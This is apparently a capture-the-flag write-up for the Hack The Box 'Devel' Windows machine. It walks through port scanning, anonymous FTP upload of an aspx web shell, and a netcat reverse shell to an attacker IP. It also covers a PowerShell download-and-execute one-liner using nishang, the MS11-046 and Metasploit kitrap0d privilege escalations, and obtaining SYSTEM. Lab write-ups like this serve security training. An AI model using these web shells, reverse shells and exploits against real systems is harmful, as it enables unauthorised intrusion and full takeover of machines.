## Default Information
IP Address: 10.10.10.5\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.5    devel.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.5 --rate=1000 -e tun0                                        148 ⨯ 1 ⚙
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-02 06:35:40 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 21/tcp on 10.10.10.5                                      
Discovered open port 80/tcp on 10.10.10.5 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 21  | ftp | Microsoft ftpd | Open |
| 80  | http | Microsoft IIS httpd 7.5 | Open |

From the nmap output, we discover that the ftp on port 21 allows anonymous login. This means that we can login to the ftp and access the files on the ftp server without having to authenticate.

```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 01-01-22  10:43PM                 2920 exploit.aspx
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
```

Apart from that, we realize that port 80 is open. This means that there is a web service for this machine and it is operating on Microsoft IIS 7.5.

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://devel.htb. However, from Gobuster there is very little endpoints that are discoverable. 

```
http://10.10.10.5:80/aspnet_client
```

### Web-content discovery

Visiting http://devel.htb/aspnet_client redirects me to 403 Forbidden and so, this is a dead-end. 

### Exploring FTP

Recalling from the nmap scan that we can do an anonymous login using FTP, we will try to login to the FTP server using anonymous:password.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp 10.10.10.5                                                                                               1 ⚙
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

Next, we will list the current files and directories on the ftp server. From the output, we realize that there is a ```aspnet_client``` directory which corresponds to the http://devel.htb/aspnet_client that we have found from gobuster earlier. This potentially means that the root directory of the web server and ftp server are the same. 

```
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
01-01-22  10:43PM                 2920 exploit.aspx
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

## Exploit
### Uploading webshell
Navigating to both http://devel.htb/iistart.htm and http://devl.htb/welcome.png, we can confirm that both of these endpoints are accessible. This means that the root directory of the web server and the ftp server are really the same. 

Since we are able to gain access to the ftp server, we would then be able to upload a webshell onto the ftp server that will then be accessible on http://devel.htb. Since we find a exploit.aspx file on the FTP server, the backend of the web service will likely be aspx. Now, we will need to find a aspx web shell and upload it to our ftp server. 


```
┌──(kali㉿kali)-[~/Desktop]
└─$ locate cmd.aspx                            
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop]
└─$ cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx .

┌──(kali㉿kali)-[~/Desktop]
└─$ ftp 10.10.10.5                                                                                               2 ⚙
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put cmd.aspx
local: cmd.aspx remote: cmd.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1442 bytes sent in 0.00 secs (20.2235 MB/s)
```

Accessing http://devel.htb/cmd.aspx will then give us a webshell.
![Webshell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Devel/webshell.png)

### Obtaining reverse shell

To obtain the reverse shell, we would first need to create a directory for smb and copy the nc.exe executable to the directory

```
┌──(kali㉿kali)-[~/Desktop]
└─$ mkdir smb

┌──(kali㉿kali)-[~/Desktop]
└─$ cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe smb
```

Afterwards, we will have to start the smbserver to host the nc.exe executable

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/impacket/examples]
└─$ impacket-smbserver share smb                                                                               2 ⚙
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Next, all we have to do is to input the following command onto the webshell at http://devel.htb/cmd.aspx to spawn the reverse shell

```
\\10.10.16.8\share\nc.exe -e cmd.exe 10.10.16.8 4000
```

### Privilege Escalation to system
However, we realize that we do not have the privileges to view the ```babis``` and ```Adminstrator``` directory yet. Hence, we would need to find a privilege escalation vector.

```
c:\Users>cd babis
cd babis
Access is denied.

c:\Users>cd Administrator
cd Administrator
Access is denied.
```

### Privilege Escalation to root

We will first use ```systeminfo``` to find out information about the server that we are looking at. From the output, we can see that this is a Microsoft Windows 7 Enterprise Build 7600 and is an x86-based PC. This is a pretty outdated software and there may be several kernel exploits that could be exploited.

```
c:\Windows\Temp>systeminfo                                   
systeminfo                                                   
Host Name:                 DEVEL                                                        
OS Name:                   Microsoft Windows 7 Enterprise                                                   
OS Version:                6.1.7600 N/A Build 7600                                                         
OS Manufacturer:           Microsoft Corporation                                                  
OS Configuration:          Standalone Workstation                                                  
OS Build Type:             Multiprocessor Free                                                         
Registered Owner:          babis                                                        
Registered Organization:                                                
Product ID:                55041-051-0948536-86302                                      
Original Install Date:     17/3/2017, 4:17:31 ��                                                           
System Boot Time:          1/1/2022, 8:18:13 ��                                                           
System Manufacturer:       VMware, Inc.                                                         
System Model:              VMware Virtual Platform                                                     
System Type:               X86-based PC 
```

Executing the WinPrivCheck.bat from [here](https://github.com/codingo/OSCP-2/edit/master/Windows/WinPrivCheck.bat), we realize that this server is vulnerable to a lot of exploits.

Unfortunately, most of these exploits are unable to work or they will spawn a new system shell with root privileges, which is not what we wanted. 

Looking up Windows 7 Build 7600 exploit, we are able to discover another exploit, MS11-046.

Executing this exploit does not show any changes, but we realized that we have now obtained system privileges when we execute the ```whoami``` command.

```
c:\Windows\Temp>.\MS11-046.exe                                                          
.\MS11-046.exe                                                          
c:\Windows\System32>whoami                                   
whoami                                                       
nt authority\system
```

### Obtaining user flag

Since we have system privileges, we are now able to obtain the user flag.

```
C:\Users\babis\Desktop>type user.txt.txt                                                          
type user.txt.txt                                                          
<Redacted user flag>
```
### Obtaining root flag

Similiarly, since we have system privileges, we are able to obtain the root flag.

```
C:\Users\Administrator\Desktop>type root.txt                                                          
type root.txt                                                          
<Redacted root flag>
```
## Post-Exploitation
### Generating reverse shells using nishang

Another way of generating reverse shell is to use the [nishang repository](https://github.com/samratashok/nishang)

First, we have to copy the Invoke-PowerShellTcp.ps1 script to our desired directory

```
┌──(kali㉿kali)-[~/Desktop/nishang/Shells]
└─$ cp Invoke-PowerShellTcp.ps1 /home/kali/Desktop 
```

Afterwards, we will have to open up the powershell script in a notepad and add the following line to the end of the script.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.8 -Port 4000
```

Now, we will open a localhost to host the Invoke-PowershellTcp.ps1 file.

```
python3 -m http.server 3000
```

Finally, we go to http://devel.htb/cmd.aspx and enter the following commands to be executed. This will download the Inoke-PowershellTcp.ps1 script and spawn the reverse shell.

```
powershell iex(new-object net.webclient).downloadstring('http://10.10.16.8:3000/Invoke-PowerShellTcp.ps1')
```

### Local Escalation using impacket-smbserver
Another way of doing local escalation is by using impacket-smbserver. 

First, set up the impacket-smbserver in the smb directory

```
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-smbserver share smb
```

All we have to do is to execute the local privilege executable from the smb server, instead of hosting it on our server and transferring it to the target server.

```
c:\Windows\Temp>//10.10.16.8/share/MS11-046.exe
//10.10.16.8/share/MS11-046.exe


c:\Windows\System32>
c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>
```

### Local privilege escalation with Metasploit
To use metasploit for local privilege escalation, we would need to first use metasploit to generate a reverse shell and afterwards, we will need to background this session using the command ```background```.

Afterwards, we will use the local_exploit_suggester in metasploit to find possible kernel exploits.

```
use post/multi/recon/local_exploit_suggester
set session 1
run
```

The execution of the local_exploit_suggester returns a list of potential vulnerabilities. For this exploitation, we will be using ```windows/local/ms10_015_kitrap0d```

```
use exploit/windows/local/ms10_015_kitrap0d
set LHOST 10.10.16.8
set session 1
run
```

